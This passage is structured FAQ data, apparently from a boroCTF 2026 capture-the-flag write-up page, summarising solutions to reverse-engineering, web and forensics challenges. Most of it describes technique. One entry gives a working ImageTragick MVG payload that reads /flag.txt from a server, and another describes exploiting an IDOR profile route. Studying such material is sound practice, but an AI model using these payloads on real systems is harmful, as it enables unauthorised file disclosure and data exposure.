    {"@type": "Question","name": "What was the hardest reverse challenge in boroCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "AlphaCode. A custom DSL whose six opcodes have to be probed empirically and whose parser's one-zm-per-program rule is actually one-open-function-at-a-time. That quirk lets you stage multiple literals on the queue and concatenate them via fr/dp pairs to produce text that interleaves the gauntlet inputs with the required template strings."}},
    {"@type": "Question","name": "How does password_protected hide the flag?","acceptedAnswer": {"@type": "Answer","text": "The strcmp gate against Rate5StarsBecauseGreatChallenge is decorative. The actual flag is a 34-byte buffer initialised one movb at a time. On a successful strcmp, a loop XORs each byte with 0x7 and prints it. Pull the bytes from the disassembly, XOR with 7, recover the flag without running the binary."}},
    {"@type": "Question","name": "How do you extract the AutoHotkey script from big_brother?","acceptedAnswer": {"@type": "Answer","text": "AutoHotkey embeds the script as RCDATA (resource type 10) in the PE's .rsrc section. wrestool -x -t10 big_brother extracts it cleanly; Resource Hacker on Windows does the same. In this build the script is close to plaintext, so even strings surfaces the full hotstring handler and the Chr() concatenated flag."}},
    {"@type": "Question","name": "What's the LCG trick in labyrinth?","acceptedAnswer": {"@type": "Answer","text": "hope() runs an XOR stream cipher whose keystream is a glibc-style LCG seeded by (r ^ (c+c)) * r. The constants 1103515245 / 12345 are the classic glibc rand() LCG. Brute-force the 10,000 (r, c) cells, pre-filter on the 0xE3 top-level code-object marker, and the unique valid cell is (91, 68) with mod = 19201. Its co_consts contains a base64-encoded flag."}},
    {"@type": "Question","name": "Why pre-filter on 0xE3 in labyrinth?","acceptedAnswer": {"@type": "Answer","text": "marshal.loads on random data can allocate gigabytes when the first byte happens to parse as a giant TYPE_LONG / TYPE_TUPLE / TYPE_DICT header. 0xE3 is TYPE_CODE | FLAG_REF, the top-level code-object marker. Pre-filtering narrows the candidate space from 10,000 to about 17 without ever calling marshal.loads on a candidate that could explode."}},
    {"@type": "Question","name": "What's the bug in boro-senpai 1?","acceptedAnswer": {"@type": "Answer","text": "IDOR on /profile/<username>. The route reads the username from the URL and renders that user's profile without comparing against the session. The UI string 'Your profile is visible only to you' is a template, not a security control. The OSINT half identifies Makise Kurisu's KuriGohanandKamehameha handle from in-character dialogue in one of the threads."}},
    {"@type": "Question","name": "What's the ImageTragick payload for Kobeni's Dashboard?","acceptedAnswer": {"@type": "Answer","text": "push graphic-context / viewbox 0 0 5000 600 / font-size 80 / image Over 0,0 0,0 'label:@/flag.txt' / pop graphic-context — uploaded as evil.mvg. The server's {ext}:{upload_path} design lets the .mvg extension select the input coder, the permissive policy.xml allows MVG, and the label:@<path> pseudo-coder reads the file and renders its content as text in the returned thumbnail. CVE-2016-3714."}},
    {"@type": "Question","name": "How do you extract the slack data in the forensics challenge?","acceptedAnswer": {"@type": "Answer","text": "blkls -s <image> from The Sleuth Kit reads every allocated block and emits only the slack space (the tail of each block from the file's last byte to the end of the block). For the 10 MB ext4 image with 500 files of 10–100 bytes, slack is roughly 2 MB total. The flag is exactly 36 non-zero bytes; tr -d '\\0' collapses to the flag."}},
    {"@type": "Question","name": "Where can I find the solver code?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs and solver scripts live at github.com/Abdelkad3r/boroCTF-2026. Each subdirectory has the writeup plus reproducer files. AlphaCode's solve.py includes the literal encoder and full snippet builder; labyrinth, password_protected, and Kobeni's Dashboard all include working payloads inline."}},
    {"@type": "Question","name": "What's the broader lesson from boroCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "Read the artifact before the wrapper. Every challenge had a prompt or UI hint pointing at a more elaborate solve than what was actually needed. password_protected looks like a strcmp bypass; the flag is in a XOR-7 reveal loop. boro-senpai 1 looks like a profile-discovery puzzle; the bug is IDOR. Kobeni's Dashboard looks like an image-format challenge; the bug is the server picking the coder from the filename. The artifact tells you what the bug is faster than the prompt does."}}
  ]
}
</script>
